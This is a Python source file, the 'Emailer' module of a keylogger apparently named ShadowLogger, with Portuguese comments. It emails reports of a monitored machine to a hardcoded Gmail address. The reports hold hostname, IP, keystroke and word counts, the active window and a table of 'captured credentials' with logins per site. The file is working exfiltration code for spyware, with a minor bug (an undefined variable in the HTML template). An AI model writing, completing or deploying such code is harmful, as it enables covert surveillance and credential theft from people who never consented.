#!/usr/bin/env python3
"""
Emailer Module - ShadowLogger
Envio de e-mails com logs, credenciais e screenshots.
"""

import os
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from datetime import datetime
import logging


class Emailer:
    def __init__(self, config):
        self.config = config
        self.sender = config.get("sender", "renatomfn6@gmail.com")
        self.receiver = config.get("receiver", "renatomfn6@gmail.com")
        self.smtp_server = config.get("smtp_server", "smtp.gmail.com")
        self.smtp_port = config.get("smtp_port", 587)
        self.username = config.get("username", "renatomfn6@gmail.com")
        self.password = config.get("password", "")
        self.subject_prefix = config.get("subject_prefix", "[ShadowLogger]")
        
        # Configura logging
        self.logger = logging.getLogger("emailer")
        self.logger.setLevel(logging.INFO)
        
        # Cria handler se não existir
        if not self.logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)

    def send_report(self, data):
        """Envia relatório por e-mail."""
        subject = f"{self.subject_prefix} - {data.get('event', 'Log Report')} - {data.get('hostname', 'Unknown')}"
        body = self._build_body(data)
        
        try:
            # Cria mensagem
            message = MIMEMultipart()
            message["From"] = self.sender
            message["To"] = self.receiver
            message["Subject"] = subject
            
            # Adiciona corpo HTML
            message.attach(MIMEText(body, "html"))
            
            # Envia e-mail
            context = ssl.create_default_context()
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls(context=context)
                server.login(self.username, self.password)
                server.sendmail(self.sender, self.receiver, message.as_string())
                
            self.logger.info(f"E-mail enviado com sucesso: {subject}")
            return True
            
        except Exception as e:
            self.logger.error(f"Erro ao enviar e-mail: {e}")
            return False

    def _build_body(self, data):
        """Monta o corpo HTML do e-mail."""
        event = data.get("event", "Log Report")
        hostname = data.get("hostname", "Unknown")
        ip = data.get("ip", "N/A")
        uptime = data.get("uptime", 0)
        keys_pressed = data.get("keys_pressed", 0)
        words_typed = data.get("words_typed", 0)
        credentials = data.get("credentials", [])
        active_window = data.get("active_window", "N/A")
        timestamp = data.get("timestamp", datetime.now().isoformat())
        
        # Formata uptime
        hours = int(uptime // 3600)
        minutes = int((uptime % 3600) // 60)
        uptime_str = f"{hours}h {minutes}m"
        
        # Constrói HTML
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>{subject}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1 {{ color: #2c3e50; }}
        .section {{ margin: 20px 0; }}
        .section h2 {{ color: #34495e; border-bottom: 2px solid #ecf0f1; }}
        table {{ width: 100%; border-collapse: collapse; }}
        th, td {{ padding: 10px; text-align: left; border-bottom: 1px solid #ecf0f1; }}
        th {{ background-color: #3498db; color: white; }}
        .status {{ font-weight: bold; }}
        .status.ok {{ color: #27ae60; }}
        .status.warning {{ color: #f39c12; }}
    </style>
</head>
<body>
    <h1>✅ {event}</h1>
    
    <div class="section">
        <h2>📊 Informações do Sistema</h2>
        <table>
            <tr><th>Hostname</th><td>{hostname}</td></tr>
            <tr><th>IP</th><td>{ip}</td></tr>
            <tr><th>Uptime</th><td>{uptime_str}</td></tr>
            <tr><th>Teclas Pressionadas</th><td>{keys_pressed:,}</td></tr>
            <tr><th>Palavras Digitadas</th><td>{words_typed:,}</td></tr>
            <tr><th>Janela Ativa</th><td>{active_window}</td></tr>
            <tr><th>Timestamp</th><td>{timestamp}</td></tr>
        </table>
    </div>
"""
        
        # Adiciona seção de credenciais se houver
        if credentials:
            html += """
    <div class="section">
        <h2>🔑 Credenciais Capturadas</h2>
        <table>
            <tr>
                <th>Site/App</th>
                <th>Login</th>
                <th>Senha</th>
                <th>Horário</th>
            </tr>
"""
            for cred in credentials[-20:]:  # Últimos 20
                site = cred.get("context", "Unknown")
                login = cred.get("key", "N/A")
                password = "•" * 8  # Placeholder para senha
                timestamp = cred.get("timestamp", "N/A")
                html += f"""
            <tr>
                <td>{site}</td>
                <td>{login}</td>
                <td>{password}</td>
                <td>{timestamp}</td>
            </tr>
"""
            html += """
        </table>
    </div>
"""
        
        html += """
    <div class="section">
        <h2>📝 Detalhes do Envio</h2>
        <p>Este relatório foi gerado automaticamente pelo ShadowLogger.</p>
        <p>Para mais informações, acesse: <a href="http://localhost:5000">http://localhost:5000</a></p>
    </div>
</body>
</html>
"""
        
        return html


if __name__ == "__main__":
    # Teste simples
    config = {
        "smtp_server": "smtp.gmail.com",
        "smtp_port": 587,
        "sender": "renatomfn6@gmail.com",
        "receiver": "renatomfn6@gmail.com",
        "username": "renatomfn6@gmail.com",
        "password": "seu-app-password-aqui"
    }
    
    emailer = Emailer(config)
    
    test_data = {
        "event": "Teste de Envio",
        "hostname": "tsunami",
        "ip": "192.168.1.100",
        "uptime": 3600,
        "keys_pressed": 5230,
        "words_typed": 1024,
        "credentials": [
            {"context": "Gmail", "key": "joao.silva@gmail.com", "timestamp": "2026-11-22T14:30:00"},
            {"context": "Facebook", "key": "joao.silva", "timestamp": "2026-11-22T14:32:00"}
        ],
        "timestamp": datetime.now().isoformat()
    }
    
    emailer.send_report(test_data)
